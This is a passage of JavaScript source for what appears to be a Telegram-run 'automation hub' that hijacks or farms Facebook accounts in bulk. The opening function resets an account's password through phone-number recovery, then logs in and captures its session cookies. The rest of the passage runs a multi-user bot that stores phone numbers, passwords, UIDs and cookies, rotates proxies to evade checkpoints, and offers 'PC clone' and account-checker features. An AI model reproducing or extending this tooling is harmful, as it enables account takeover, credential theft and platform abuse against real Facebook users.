          body: new URLSearchParams(sFields).toString(),
          headers: { Referer: curUrl, Origin: new URL(sAct).origin, 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        curUrl = rStay.url || sAct;
        body = rStay.text || '';
      }
    } catch {
      // ignore non-fatal continuation error
    }
  }

  if (jar.c_user && jar.xs) {
    return { status: 'OK', uid: jar.c_user, pass: newPass, cookies: orderCookies(jar) };
  }

  // Attempt fresh direct login with recovered phone + new password so full c_user + xs cookies are issued
  const loggedUid = await loginUid(item.phone, newPass, cfg, jar, px);
  if (loggedUid && jar.xs) {
    return { status: 'OK', uid: loggedUid, pass: newPass, cookies: orderCookies(jar) };
  }
  const directUid = jar.c_user || extractUidFromHtml(body, curUrl);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return { status: 'OK', uid: directUid, pass: newPass, cookies: orderCookies(jar) };
  }
  if (directUid || loggedUid) {
    const uidOut = directUid || loggedUid;
    jar.c_user = uidOut;
    if (Object.keys(jar).length > 0) {
      return { status: 'OK', uid: uidOut, pass: newPass, cookies: orderCookies(jar) };
    }
  }

  const nextF = readForm(body, 'otp');
  if (nextF.action && (OTP_FIELDS.some((k) => k in nextF.inputs) || /checkpoint|recover\/code/i.test(`${curUrl} ${nextF.action}`))) {
    item.action = nextF.action;
    item.fields = Object.fromEntries(Object.entries(nextF.inputs || {}).map(([k, v]) => [k, v[1]]));
    item.cookies = orderCookies(jar);
    item.confirm_url = curUrl;
    item.pass = newPass;
    return { status: 'RETRY', item };
  }

  return { status: 'FAIL', err: 'OTP accepted or expired, but Facebook blocked session cookie issue (checkpoint/2FA).' };
}

// ----------------------------------------------------------------------------
// 6. Multi-User Telegram Bot Manager
// ----------------------------------------------------------------------------
function createStandaloneBot(botToken) {
  const DEFAULT_SETTINGS = {
    brandName: DEFAULT_BRAND_NAME,
    adminId: DEFAULT_ADMIN_ID,
    adminUsername: DEFAULT_ADMIN_USERNAME,
    ownerUrl: DEFAULT_OWNER_URL,
    channelUrl: DEFAULT_CHANNEL_URL,
    requireApproval: false,
    requireChannelJoin: false,
    maintenanceMode: false,
    defaultDailyLimit: 25,
    defaultEngineMode: 'hybrid',
    defaultPrecheckGql: true,
    shareGlobalProxies: true,
    defaultVoltxKey: '',
    defaultVoltxBase: '',
    welcomeNote: `Welcome to ${DEFAULT_BRAND_NAME} Multi-User Automation Hub. Channel: ${DEFAULT_CHANNEL_URL}`,
  };

  function resolveVoltxCreds(uid) {
    const st = readSettings();
    const cfg = uid ? readUserConfig(uid) : {};
    const apiKey = String(cfg.voltx_api_key || st.defaultVoltxKey || DEFAULT_VOLTX_KEY || '').trim();
    const baseUrl = String(cfg.voltx_base_url || st.defaultVoltxBase || DEFAULT_VOLTX_BASE).trim().replace(/\/+$/, '');
    return { apiKey, baseUrl };
  }

  function getChannelHandle(url) {
    const raw = String(url || DEFAULT_CHANNEL_URL).trim();
    if (raw.startsWith('@')) return raw;
    const m = raw.match(/t\.me\/([A-Za-z0-9_]+)/i);
    return m ? `@${m[1]}` : raw;
  }

  function normalizeTgLink(input, fallbackUrl) {
    const raw = String(input || '').trim();
    if (!raw) return { handle: DEFAULT_ADMIN_USERNAME, url: fallbackUrl };
    if (/^https?:\/\//i.test(raw)) {
      const m = raw.match(/t\.me\/([A-Za-z0-9_]+)/i);
      return { handle: m ? `@${m[1]}` : raw, url: raw };
    }
    if (/^t\.me\//i.test(raw)) {
      const clean = raw.replace(/^t\.me\//i, '').replace(/\/+$/, '');
      return { handle: `@${clean.replace(/^@/, '')}`, url: `https://t.me/${clean.replace(/^@/, '')}` };
    }
    const clean = raw.replace(/^@/, '');
    return { handle: `@${clean}`, url: `https://t.me/${clean}` };
  }

  function isUserAdmin(user, st) {
    return Boolean(user && (user.id === st.adminId || user.id === DEFAULT_ADMIN_ID || user.role === 'admin'));
  }

  let running = false;
  let connected = false;
  let botInfo = null;
  let lastError = '';
  let startedAt = null;
  let pollAbort = null;
  let offset = 0;

  const logs = [];
  const promptSessions = new Map();
  const activeRuns = new Map();
  const normalizedCache = new Map();
  const normalizedFreeCache = new Map();
  const normalizedTakenCache = new Map();

  const channelMemberCache = new Map();
  let settingsCache = null;
  let usersMapCache = null;
  let usersMapLastDiskWrite = 0;

  function pushBotLog(msg) {
    const line = appendDebugLog(`[TG-BOT] ${msg}`);
    logs.push(line);
    if (logs.length > 200) logs.splice(0, logs.length - 200);
    console.log(line);
  }

  function readSettings() {
    if (settingsCache) return settingsCache;
    try {
      if (fs.existsSync(FILES.botSettings)) {
        settingsCache = { ...DEFAULT_SETTINGS, ...JSON.parse(fs.readFileSync(FILES.botSettings, 'utf-8')) };
        return settingsCache;
      }
    } catch {
      // ignore
    }
    settingsCache = { ...DEFAULT_SETTINGS };
    return settingsCache;
  }

  function writeSettings(patch) {
    const merged = { ...readSettings(), ...patch };
    settingsCache = merged;
    fs.writeFileSync(FILES.botSettings, JSON.stringify(merged, null, 2), 'utf-8');
    return merged;
  }

  function readUsersMap() {
    if (usersMapCache) return usersMapCache;
    try {
      if (fs.existsSync(FILES.botUsers)) {
        const parsed = JSON.parse(fs.readFileSync(FILES.botUsers, 'utf-8'));
        if (parsed && typeof parsed === 'object') {
          usersMapCache = parsed;
          return usersMapCache;
        }
      }
    } catch {
      // ignore
    }
    usersMapCache = {};
    return usersMapCache;
  }

  function writeUsersMap(map) {
    usersMapCache = map;
    usersMapLastDiskWrite = Date.now();
    fs.writeFileSync(FILES.botUsers, JSON.stringify(map, null, 2), 'utf-8');
  }

  function ensureAdminSeed() {
    const st = readSettings();
    const map = readUsersMap();
    const today = new Date().toISOString().slice(0, 10);
    if (st.adminId && !map[st.adminId]) {
      map[st.adminId] = {
        id: st.adminId,
        username: st.adminUsername.replace(/^@/, ''),
        firstName: 'Admin',
        role: 'admin',
        status: 'approved',
        dailyLimit: 9999,
        usedToday: 0,
        lastResetDate: today,
        totalOk: 0,
        totalPending: 0,
        totalFail: 0,
        joinedAt: Date.now(),
        lastActiveAt: Date.now(),
      };
      writeUsersMap(map);
    }
  }
  ensureAdminSeed();

  function getUserDir(userId) {
    const uid = String(userId).trim();
    if (!/^\d{1,20}$/.test(uid)) throw new Error('Invalid Telegram user ID');
    const resolved = path.resolve(FILES.botUsersDir, uid);
    if (!resolved.startsWith(FILES.botUsersDir + path.sep)) throw new Error('Path confinement violation');
    if (!fs.existsSync(resolved)) fs.mkdirSync(resolved, { recursive: true });
    return resolved;
  }

  function getUserFiles(userId) {
    const dir = getUserDir(userId);
    return {
      config: path.join(dir, 'config.json'),
      pending: path.join(dir, 'pending.json'),
      accountsJsonl: path.join(dir, 'accounts.jsonl'),
      accountsTxt: path.join(dir, 'accounts.txt'),
      successTxt: path.join(dir, 'success.txt'),
      proxies: path.join(dir, 'proxies.txt'),
      cookies: path.join(dir, 'base_cookies.txt'),
      done: path.join(dir, 'done.txt'),
      debugLog: path.join(dir, 'debug.log'),
      debugHtml: path.join(dir, 'last_debug.html'),
    };
  }

  function appendUserLog(uid, msg) {
    try {
      const files = getUserFiles(uid);
      const ts = new Date().toISOString().replace('T', ' ').slice(11, 19);
      fs.appendFileSync(files.debugLog, `[${ts}] ${msg}\n`, 'utf-8');
    } catch {
      // ignore
    }
  }

  function readUserLogs(uid, limit = 30) {
    try {
      const files = getUserFiles(uid);
      if (!fs.existsSync(files.debugLog)) return [];
      return fs.readFileSync(files.debugLog, 'utf-8').split(/\r?\n/).filter(Boolean).slice(-limit);
    } catch {
      return [];
    }
  }

  function clearUserLogs(uid) {
    try {
      const files = getUserFiles(uid);
      fs.writeFileSync(files.debugLog, '', 'utf-8');
      if (fs.existsSync(files.debugHtml)) fs.writeFileSync(files.debugHtml, '', 'utf-8');
    } catch {
      // ignore
    }
  }

  function saveUserDebugHtml(uid, html) {
    if (!html) return;
    try {
      const files = getUserFiles(uid);
      fs.writeFileSync(files.debugHtml, html.slice(0, 12000), 'utf-8');
    } catch {
      // ignore
    }
  }

  function getOrCreateUser(tgUser) {
    const st = readSettings();
    const uid = String(tgUser.id);
    const isAdmin = uid === st.adminId;
    const today = new Date().toISOString().slice(0, 10);
    const map = readUsersMap();
    const existing = map[uid];

    if (!existing) {
      const rec = {
        id: uid,
        username: tgUser.username || '',
        firstName: tgUser.first_name || 'User',
        role: isAdmin ? 'admin' : 'user',
        status: isAdmin || !st.requireApproval ? 'approved' : 'pending',
        dailyLimit: isAdmin ? 9999 : st.defaultDailyLimit,
        usedToday: 0,
        lastResetDate: today,
        totalOk: 0,
        totalPending: 0,
        totalFail: 0,
        joinedAt: Date.now(),
        lastActiveAt: Date.now(),
      };
      map[uid] = rec;
      writeUsersMap(map);
      return rec;
    }

    const prevUsername = existing.username;
    const prevFirstName = existing.firstName;
    const prevResetDate = existing.lastResetDate;
    const prevRole = existing.role;
    const prevStatus = existing.status;

    if (tgUser.username !== undefined) existing.username = tgUser.username;
    if (tgUser.first_name) existing.firstName = tgUser.first_name;
    const now = Date.now();
    existing.lastActiveAt = now;
    if (existing.lastResetDate !== today) {
      existing.usedToday = 0;
      existing.lastResetDate = today;
    }
    if (isAdmin) {
      existing.role = 'admin';
      existing.status = 'approved';
    }
    map[uid] = existing;
    const changed =
      prevUsername !== existing.username ||
      prevFirstName !== existing.firstName ||
      prevResetDate !== existing.lastResetDate ||
      prevRole !== existing.role ||
      prevStatus !== existing.status;
    if (changed || now - usersMapLastDiskWrite > 60000) {
      writeUsersMap(map);
    }
    return existing;
  }

  function readUserConfig(uid) {
    const files = getUserFiles(uid);
    const st = readSettings();
    const base = {
      ...DEFAULT_CONFIG,
      engine_mode: st.defaultEngineMode || DEFAULT_CONFIG.engine_mode,
      precheck_gql: st.defaultPrecheckGql !== false,
    };
    try {
      if (fs.existsSync(files.config)) {
        const merged = { ...base, ...JSON.parse(fs.readFileSync(files.config, 'utf-8')) };
        merged.proxy = merged.proxy ? validateProxyUrl(merged.proxy) || '' : '';
        merged.auto_proxy_refresh = merged.auto_proxy_refresh !== false;
        merged.auto_proxy_country = merged.auto_proxy_country !== false;
        merged.proxy_saver = merged.proxy_saver !== false;
        merged.gql_via_direct = merged.gql_via_direct !== false;
        merged.checker_use_proxy = Boolean(merged.checker_use_proxy);
        const rawResend = Number(merged.auto_otp_resend);
        merged.auto_otp_resend = Number.isFinite(rawResend) ? Math.max(0, Math.min(3, Math.round(rawResend))) : 2;
        const rawPcResend = Number(merged.pc_otp_resends);
        merged.pc_otp_resends = Number.isFinite(rawPcResend) ? Math.max(1, Math.min(10, Math.round(rawPcResend))) : 3;
        merged.pc_recovery_urls = normalizePcRecoveryUrls(merged.pc_recovery_urls, { fallbackToDefaults: true });
        return merged;
      }
    } catch {
      // ignore
    }
    return base;
  }

  function writeUserConfig(uid, patch) {
    const files = getUserFiles(uid);
    const next = { ...readUserConfig(uid), ...patch };
    fs.writeFileSync(files.config, JSON.stringify(next, null, 2), 'utf-8');
    return next;
  }

  function readUserCookies(uid) {
    const files = getUserFiles(uid);
    try {
      if (fs.existsSync(files.cookies)) {
        const raw = fs.readFileSync(files.cookies, 'utf-8').trim();
        if (raw) return normalizeBaseCookiesRaw(raw);
      }
    } catch {
      // ignore
    }
    const fresh = normalizeBaseCookiesRaw('');
    fs.writeFileSync(files.cookies, fresh, 'utf-8');
    return fresh;
  }

  function writeUserCookies(uid, raw) {
    const files = getUserFiles(uid);
    const normalized = normalizeBaseCookiesRaw(raw);
    fs.writeFileSync(files.cookies, normalized, 'utf-8');
    return normalized;
  }

  function regenUserCookies(uid) {
    const files = getUserFiles(uid);
    const fresh = normalizeBaseCookiesRaw('');
    fs.writeFileSync(files.cookies, fresh, 'utf-8');
    return fresh;
  }

  function wipeUserCookiesAndCache(uid) {
    const fresh = regenUserCookies(uid);
    clearUserDone(uid);
    clearUserLogs(uid);
    normalizedCache.delete(uid);
    normalizedFreeCache.delete(uid);
    normalizedTakenCache.delete(uid);
    voltxRangeCache.delete(uid);
    const otherRunning = Array.from(activeRuns.entries()).some(([k, r]) => k !== uid && r?.running);
    if (!otherRunning) {
      gqlSessionCache = null;
      proxyHealth.clear();
      dynamicProxyTagBlacklist.clear();
    }
    return { fresh };
  }

  function wipeAllUserData(uid) {
    const res = wipeUserCookiesAndCache(uid);
    writeUserPending(uid, []);
    clearUserAccounts(uid);
    writeUserProxies(uid, []);
    promptSessions.delete(uid);
    const map = readUsersMap();
    if (map[uid]) {
      map[uid].totalPending = 0;
      writeUsersMap(map);
    }
    return res;
  }

  function readUserProxies(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.proxies)) return [];
      return parseProxyLines(fs.readFileSync(files.proxies, 'utf-8'));
    } catch {
      return [];
    }
  }

  function writeUserProxies(uid, list) {
    const files = getUserFiles(uid);
    const unique = Array.from(new Set(list.map((l) => validateProxyUrl(l) || '').filter(Boolean)));
    fs.writeFileSync(files.proxies, unique.join('\n') + (unique.length ? '\n' : ''), 'utf-8');
  }

  function readUserPending(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.pending)) return [];
      const parsed = JSON.parse(fs.readFileSync(files.pending, 'utf-8'));
      if (!Array.isArray(parsed)) return [];
      const clean = parsed.filter(
        (p) => !(p && /\/reg\/submit\//i.test(p.confirm_url || '') && !p.action && !p.uid)
      );
      if (clean.length !== parsed.length) {
        fs.writeFileSync(files.pending, JSON.stringify(clean, null, 2), 'utf-8');
      }
      return clean;
    } catch {
      return [];
    }
  }

  function writeUserPending(uid, items) {
    const files = getUserFiles(uid);
    const sanitized = (Array.isArray(items) ? items : []).map((p) => {
      if (!p || typeof p !== 'object') return p;
      const copy = { ...p };
      delete copy._lastConfirmHtml;
      return copy;
    });
    fs.writeFileSync(files.pending, JSON.stringify(sanitized, null, 2), 'utf-8');
  }

  function pushUserPending(uid, item) {
    const items = readUserPending(uid);
    if (items.some((p) => p.phone === item.phone)) return;
    items.push({ ...item, createdAt: item.createdAt || Date.now() });
    writeUserPending(uid, items);
  }

  function upsertUserPending(uid, item) {
    if (!item || !item.phone) return;
    const items = readUserPending(uid);
    const idx = items.findIndex((p) => p.phone === item.phone);
    if (idx >= 0) {
      items[idx] = { ...items[idx], ...item, createdAt: items[idx].createdAt || item.createdAt || Date.now() };
    } else {
      items.push({ ...item, createdAt: item.createdAt || Date.now() });
    }
    writeUserPending(uid, items);
  }

  function readUserDone(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.done)) return new Set();
      return new Set(fs.readFileSync(files.done, 'utf-8').split(/\r?\n/).map((l) => l.trim()).filter(Boolean));
    } catch {
      return new Set();
    }
  }

  function markUserDone(uid, phone) {
    const files = getUserFiles(uid);
    fs.appendFileSync(files.done, phone + '\n', 'utf-8');
  }

  function clearUserDone(uid) {
    const files = getUserFiles(uid);
    fs.writeFileSync(files.done, '', 'utf-8');
  }

  function readUserAccounts(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.accountsJsonl)) return [];
      return fs
        .readFileSync(files.accountsJsonl, 'utf-8')
        .split(/\r?\n/)
        .filter(Boolean)
        .map((l) => {
          try {
            return JSON.parse(l);
          } catch {
            return null;
          }
        })
        .filter(Boolean)
        .reverse();
    } catch {
      return [];
    }
  }

  function clearUserAccounts(uid) {
    const files = getUserFiles(uid);
    fs.writeFileSync(files.accountsJsonl, '', 'utf-8');
    fs.writeFileSync(files.accountsTxt, '', 'utf-8');
    fs.writeFileSync(files.successTxt, '', 'utf-8');
  }

  function storeUserAccount(uid, rec) {
    const files = getUserFiles(uid);
    const pid = rec.printer || printerId();
    const cookies = orderCookies(rec.cookies || {});
    const cstr = formatCookieHeader(cookies) || '-';
    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const txtBlock =
      `\n===== ${stamp} =====\n` +
      `NAME    : ${rec.name}\n` +
      `NUMBER  : +${rec.phone}\n` +
      `PASSWORD: ${rec.pass}\n` +
      `UID     : ${rec.uid || ''}\n` +
      `STATUS  : ${rec.status}\n` +
      `PRINTER : ${pid}\n` +
      (rec.engine ? `ENGINE  : ${rec.engine}\n` : '') +
      `COOKIE  : ${cstr}\n` +
      (rec.err ? `ERR     : ${rec.err}\n` : '');
    fs.appendFileSync(files.accountsTxt, txtBlock, 'utf-8');

    const obj = {
      ts: Math.floor(Date.now() / 1000),
      name: rec.name,
      number: rec.phone,
      password: rec.pass,
      uid: rec.uid || '',
      status: rec.status,
      confirmed: Boolean(rec.confirmed),
      printer: pid,
      engine: rec.engine || '',
      cookies,
      err: rec.err || '',
    };
    fs.appendFileSync(files.accountsJsonl, JSON.stringify(obj) + '\n', 'utf-8');

    if (rec.status === 'OK' && rec.uid && rec.pass) {
      let exists = false;
      try {
        if (fs.existsSync(files.successTxt)) {
          exists = fs.readFileSync(files.successTxt, 'utf-8').split(/\r?\n/).some((l) => l.split('|', 1)[0].trim() === rec.uid);
        }
      } catch {
        exists = false;
      }
      if (!exists) fs.appendFileSync(files.successTxt, `${rec.uid}|${rec.pass}\n`, 'utf-8');
    }
  }

  let tgRateLimitUntil = 0;
  const lastChatEditAt = new Map();

  async function tgCurlPostJson(url, bodyStr, timeoutMs, signal) {
    const maxSec = Math.max(5, Math.ceil(timeoutMs / 1000));
    return await new Promise((resolve, reject) => {
      const args = [
        '-sS',
        '--http1.1',
        '--connect-timeout',
        '6',
        '--max-time',
        String(maxSec),
        '-H',
        'Content-Type: application/json',
        '--data-binary',
        '@- ',
        url,
      ];
      args[args.length - 2] = '@-';
      const child = spawn('curl', args, { shell: false });
      const outChunks = [];
      const errChunks = [];
      const onAbort = () => {
        try { child.kill('SIGKILL'); } catch { /* ignore */ }
      };
      if (signal) {
        if (signal.aborted) {
          onAbort();
          return reject(new Error('Aborted'));
        }
        signal.addEventListener('abort', onAbort, { once: true });
      }
      child.stdout.on('data', (c) => outChunks.push(c));
      child.stderr.on('data', (c) => errChunks.push(c));
      child.on('error', (err) => {
        if (signal) signal.removeEventListener('abort', onAbort);
        reject(err);
      });
      child.on('close', (code) => {
        if (signal) signal.removeEventListener('abort', onAbort);
        const raw = Buffer.concat(outChunks).toString('utf-8').trim();
        if (raw) {
          try {
            return resolve(JSON.parse(raw));
          } catch {
            // fall through
          }
        }
        const errMsg = Buffer.concat(errChunks).toString('utf-8').trim();
        reject(new Error(errMsg || `curl exit ${code}`));
      });
      child.stdin.write(bodyStr);
      child.stdin.end();
    });
  }

  async function tgCall(method, payload = {}, signal, opts = {}) {
    const url = `https://api.telegram.org/bot${botToken}/${method}`;
    const bodyStr = JSON.stringify(payload);
    const timeoutMs = method === 'getUpdates' ? 40000 : 18000;
    const maxAttempts = opts.noRetry || method === 'getUpdates' || method === 'answerCallbackQuery' ? 1 : 2;

    if (opts.noRetry && tgRateLimitUntil > Date.now()) {
      return { ok: false, error_code: 429, description: 'Rate-limit cooldown active' };
    }

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        let data;
        try {
          data = await tgCurlPostJson(url, bodyStr, timeoutMs, signal);
        } catch (curlErr) {
          if (curlErr && curlErr.code === 'ENOENT') {
            const reqSignal = signal || AbortSignal.timeout(timeoutMs);
            const res = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: bodyStr,
              signal: reqSignal,
            });
            data = await res.json();
          } else {
            throw curlErr;
          }
        }

        if (!data.ok && data.error_code === 429) {
          const retryAfter = Number(data?.parameters?.retry_after || 15);
          tgRateLimitUntil = Math.max(tgRateLimitUntil, Date.now() + (retryAfter + 1) * 1000);
          if (!opts.noRetry && attempt + 1 < maxAttempts && retryAfter <= 12) {
            await new Promise((r) => setTimeout(r, (retryAfter + 1) * 1000));
            continue;
          }
        }
        return data;
      } catch (err) {
        if (attempt + 1 >= maxAttempts) {
          return { ok: false, description: err instanceof Error ? err.message : 'Network error' };
        }
        await new Promise((r) => setTimeout(r, 1200 * (attempt + 1)));
      }
    }
    return { ok: false, description: 'Max retries exceeded' };
  }

  const btnOk = (text, callback_data) => ({ text, callback_data, style: 'success' });
  const btnBad = (text, callback_data) => ({ text, callback_data, style: 'danger' });
  const btnNav = (text, callback_data) => ({ text, callback_data, style: 'primary' });
  const btnUrl = (text, url, style = 'primary') => ({ text, url, style });

  function stripMarkupStyles(replyMarkup) {
    if (!replyMarkup) return undefined;
    if (Array.isArray(replyMarkup.inline_keyboard)) {
      return {
        ...replyMarkup,
        inline_keyboard: replyMarkup.inline_keyboard.map((row) =>
          row.map((btn) => {
            const copy = { ...btn };
            delete copy.style;
            return copy;
          })
        ),
      };
    }
    return replyMarkup;
  }

  function renderProgressBar(done, total, width = 10) {
    const safeTotal = Math.max(1, Number(total) || 1);
    const ratio = Math.max(0, Math.min(1, (Number(done) || 0) / safeTotal));
    const filled = Math.round(ratio * width);
    const pct = Math.round(ratio * 100);
    return `${'█'.repeat(filled)}${'░'.repeat(width - filled)} ${pct}%`;
  }

  function formatDuration(sec) {
    const s = Math.max(0, Math.floor(Number(sec) || 0));
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const r = s % 60;
    if (h > 0) return `${h}h ${m}m ${r}s`;
    if (m > 0) return `${m}m ${r}s`;
    return `${r}s`;
  }

  const DIVIDER = `━━━━━━━━━━━━━━━━━━━━`;

  function isHtmlParseError(res) {
    const desc = String(res?.description || '').toLowerCase();
    return Number(res?.error_code) === 400 && (desc.includes('parse') || desc.includes('entity') || desc.includes('tag') || desc.includes('unsupported'));
  }

  async function sendMessage(chatId, text, replyMarkup, opts = {}) {
    const body = text.length > 4000 ? text.slice(0, 3990) + '...' : text;
    let activeMarkup = replyMarkup;
    let res = await tgCall('sendMessage', {
      chat_id: chatId,
      text: body,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(activeMarkup ? { reply_markup: activeMarkup } : {}),
    }, undefined, opts);
    if (!res.ok && String(res.description || '').toLowerCase().includes('style') && activeMarkup) {
      activeMarkup = stripMarkupStyles(activeMarkup);
      res = await tgCall('sendMessage', {
        chat_id: chatId,
        text: body,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: activeMarkup,
      }, undefined, opts);
    }
    if (!res.ok && isHtmlParseError(res)) {
      pushBotLog(`[TG-SEND-HTML-FALLBACK] chatId ${chatId}: ${res.description || 'failed'}`);
      res = await tgCall('sendMessage', {
        chat_id: chatId,
        text: body.replace(/<[^>]+>/g, ''),
        disable_web_page_preview: true,
        ...(activeMarkup ? { reply_markup: stripMarkupStyles(activeMarkup) } : {}),
      }, undefined, opts);
    }
    if (!res.ok && res.error_code !== 429) {
      pushBotLog(`[TG-SEND-FAILED] chatId ${chatId}: ${res.description || 'unknown'}`);
    }
    return res;
  }

  async function editMessage(chatId, messageId, text, replyMarkup, opts = {}) {
    if (opts.throttle) {
      if (tgRateLimitUntil > Date.now()) return { ok: true, skipped: true };
      const now = Date.now();
      const prev = lastChatEditAt.get(String(chatId)) || 0;
      if (now - prev < (opts.minIntervalMs || 2500)) return { ok: true, skipped: true };
      lastChatEditAt.set(String(chatId), now);
    }
    const body = text.length > 4000 ? text.slice(0, 3990) + '...' : text;
    let activeMarkup = replyMarkup;
    let res = await tgCall('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: body,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(activeMarkup ? { reply_markup: activeMarkup } : {}),
    }, undefined, opts);
    if (!res.ok && String(res.description || '').toLowerCase().includes('style') && activeMarkup) {
      activeMarkup = stripMarkupStyles(activeMarkup);
      res = await tgCall('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text: body,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: activeMarkup,
      }, undefined, opts);
    }
    if (!res.ok && isHtmlParseError(res)) {
      res = await tgCall('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text: body.replace(/<[^>]+>/g, ''),
        disable_web_page_preview: true,
        ...(activeMarkup ? { reply_markup: stripMarkupStyles(activeMarkup) } : {}),
      }, undefined, opts);
    }
    if (!res.ok && String(res.description || '').includes('message is not modified')) {
      return { ok: true };
    }
    if (!res.ok && res.error_code !== 429 && !opts.noRetry) {
      pushBotLog(`[TG-EDIT-FAILED] msg ${messageId}: ${res.description || 'unknown'}`);
    }
    return res;
  }

  async function sendDocumentText(chatId, filename, content, caption = '') {
    const safeName = String(filename || 'export.txt').replace(/[^a-zA-Z0-9._-]/g, '_');
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
    try {
      const okCurl = await new Promise((resolve) => {
        const args = [
          '-sS',
          '--http1.1',
          '--connect-timeout',
          '6',
          '--max-time',
          '25',
          '-F',
          `chat_id=${String(chatId)}`,
          ...(caption ? ['-F', `caption=${String(caption).slice(0, 900)}`] : []),
          '-F',
          `document=@-;filename=${safeName};type=text/plain`,
          url,
        ];
        const child = spawn('curl', args, { shell: false });
        const chunks = [];
        child.stdout.on('data', (c) => chunks.push(c));
        child.on('error', () => resolve(null));
        child.on('close', () => {
          try {
            const parsed = JSON.parse(Buffer.concat(chunks).toString('utf-8').trim() || '{}');
            resolve(parsed);
          } catch {
            resolve({ ok: false });
          }
        });
        child.stdin.write(String(content ?? ''));
        child.stdin.end();
      });
      if (okCurl !== null) return okCurl;
    } catch {
      // fall through to fetch
    }
    try {
      const form = new FormData();
      form.append('chat_id', String(chatId));
      if (caption) form.append('caption', String(caption).slice(0, 900));
      form.append('document', new Blob([String(content ?? '')], { type: 'text/plain;charset=utf-8' }), safeName);
      const r = await fetch(url, { method: 'POST', body: form, signal: AbortSignal.timeout(25000) });
      return await r.json();
    } catch (err) {
      return { ok: false, description: err instanceof Error ? err.message : 'sendDocument failed' };
    }
  }

  async function tgDownloadFileText(filePath) {
    const url = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
    try {
      const okText = await new Promise((resolve, reject) => {
        const args = ['-sS', '--http1.1', '--connect-timeout', '6', '--max-time', '25', url];
        const child = spawn('curl', args, { shell: false });
        const chunks = [];
        const errChunks = [];
        child.stdout.on('data', (c) => chunks.push(c));
        child.stderr.on('data', (c) => errChunks.push(c));
        child.on('error', (err) => reject(err));
        child.on('close', (code) => {
          if (code === 0) resolve(Buffer.concat(chunks).toString('utf-8'));
          else reject(new Error(Buffer.concat(errChunks).toString('utf-8').trim() || `curl exit ${code}`));
        });
      });
      return okText;
    } catch (err) {
      if (err && err.code === 'ENOENT') {
        const resp = await fetch(url, { signal: AbortSignal.timeout(20000) });
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        return await resp.text();
      }
      throw err;
    }
  }

  async function checkChannelMembership(uid, st) {
    if (!st.requireChannelJoin) return { ok: true };
    const handle = getChannelHandle(st.channelUrl);
    if (!handle || !handle.startsWith('@')) return { ok: true };
    const cacheKey = `${uid}:${handle}`;
    const cached = channelMemberCache.get(cacheKey);
    if (cached && Date.now() - cached.ts < 60000) {
      return cached.val;
    }
    const res = await tgCall('getChatMember', { chat_id: handle, user_id: Number(uid) || uid });
    if (!res.ok || !res.result) {
      // Fail-open if bot is not yet admin in the channel so users are not soft-locked
      const failOpen = { ok: true, warning: res.description || 'Cannot query channel membership' };
      channelMemberCache.set(cacheKey, { ts: Date.now(), val: failOpen });
      return failOpen;
    }
    const status = String(res.result.status || '').toLowerCase();
    const joined = ['member', 'administrator', 'creator', 'restricted'].includes(status);
    const out = { ok: joined, status };
    if (joined) channelMemberCache.set(cacheKey, { ts: Date.now(), val: out });
    return out;
  }

  function buildMainMenuKb(uid, isAdmin, stInput) {
    const st = stInput || readSettings();
    const pendingCnt = readUserPending(uid).length;
    const accCnt = readUserAccounts(uid).filter((a) => a.status === 'OK').length;
    const proxyCnt = readUserProxies(uid).length;
    const run = activeRuns.get(uid);
    const rows = [
      [
        btnOk('🚀 Run Numbers', 'menu:run'),
        btnOk('📡 Voltx Auto FB', 'menu:voltx'),
      ],
      [
        pendingCnt > 0 ? btnOk(`🔐 OTP Queue (${pendingCnt})`, 'menu:otp') : btnNav(`🔐 OTP Queue (${pendingCnt})`, 'menu:otp'),
        btnNav(`📦 Accounts (${accCnt})`, 'menu:accounts'),
      ],
      [
        btnNav(`🌐 Proxies (${proxyCnt})`, 'menu:proxies'),
        btnNav('⚙️ All Settings', 'menu:settings'),
      ],
      [
        btnNav('🍪 Cookies', 'menu:cookie'),
        btnOk('🔍 FB Checker', 'menu:normalize'),
      ],
      [
        btnOk('💻 PC clone', 'menu:pc_clone'),
        btnBad('🧼 Fresh Cookies', 'cookies:fresh_all'),
      ],
      [
        btnNav('🩺 Diagnose', 'menu:diagnose'),
        btnNav('📜 Debug Logs', 'menu:logs'),
      ],
      [
        btnNav('📊 My Stats', 'menu:stats'),
      ],
    ];
    if (run?.running) rows.push([btnBad('🛑 Stop Active Run', 'menu:stop')]);
    if (isAdmin) rows.push([btnOk('👑 Admin Panel', 'admin:home')]);
    rows.push([
      btnOk('🔄 Refresh Dashboard', 'menu:home'),
      btnNav('❓ Help & Info', 'menu:help'),
    ]);
    rows.push([
      btnUrl(`📢 ${getChannelHandle(st.channelUrl)}`, st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
      btnUrl(`👑 Owner`, st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
    ]);
    return { inline_keyboard: rows };
  }

  function buildHomeText(user, cfg, st) {
    const pendingCnt = readUserPending(user.id).length;
    const readyCnt = readUserAccounts(user.id).filter((a) => a.status === 'OK').length;
    const proxyList = readUserProxies(user.id);
    const proxyCnt = proxyList.length;
    const doneCnt = readUserDone(user.id).size;
    const run = activeRuns.get(user.id);
    const activeTotal = Array.from(activeRuns.values()).filter((r) => r?.running).length;
    const pwBadge = cfg.password ? `🟢 Set (${cfg.password.length}c)` : `🔴 NOT SET`;
    const runnerBadge = run?.running
